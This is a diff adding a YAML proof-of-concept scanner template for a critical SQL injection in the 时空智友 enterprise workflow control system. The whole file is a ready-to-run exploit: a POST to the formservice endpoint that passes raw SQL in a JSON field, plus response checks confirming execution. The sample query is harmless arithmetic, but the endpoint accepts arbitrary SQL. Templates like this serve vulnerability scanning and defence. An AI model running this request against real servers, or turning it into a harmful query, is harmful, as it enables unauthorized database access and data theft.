@@ -1,0 +1,22 @@
+id: poc-yaml-shi-kong-zhi-you-formservice-sql
+info:
+  name: 时空智友企业流程化管控系统-formservice-SQL注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 时空智友企业流程化管控系统
+variables:
+  v1: random_int(10000,100000)
+  v2: random_int(1000,10000)
+requests:
+- method: POST
+  path: /formservice?service=workflow.sqlResult
+  headers:
+    Content-Type: application/json
+  data: '{"params": {"a": "1"}, "sql": "select {{.v1}}-{{.v2}}"}
+
+    '
+  expression: "status_code == 200 \n&& contains(body, \"<?xml version=\\\"1.0\\\"\
+    \ encoding=\\\"utf-8\\\"?>\") \n&& (contains(body,\"<root>\") && contains(body,\
+    \ v1-v2))\n|| (contains(body,\"<errmsg>ORA-00923: 未找到要求的 FROM 关键字\"))\n"
+transport: http
